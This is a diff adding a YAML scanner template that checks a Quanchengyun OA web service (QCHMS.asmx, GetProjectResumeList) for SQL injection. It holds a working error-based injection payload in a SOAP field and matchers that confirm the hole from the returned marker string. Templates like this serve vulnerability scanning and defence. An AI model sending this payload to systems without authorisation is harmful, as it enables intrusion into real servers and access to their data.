@@ -1,0 +1,37 @@
+id: quanchengyunOA-QCHMS-sql
+
+info:
+  name: 全程云OA QCHMS.asmx 接口存在SQL注入漏洞
+  author: quanchengyunOA
+  severity: high
+  tags: quanchengyunOA
+
+http:
+  - raw:
+      - |
+        POST /OA/HMS/QCHMS.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetProjectResumeList"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <GetProjectResumeList xmlns="http://tempuri.org/">
+              <pageIndex>1</pageIndex>
+              <pageSize>20</pageSize>
+              <condition> AND 1078 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1078=1078) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)))</condition>
+            </GetProjectResumeList>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "qvkvq1qqqkq"
+      - type: status
+        status:
+          - 500
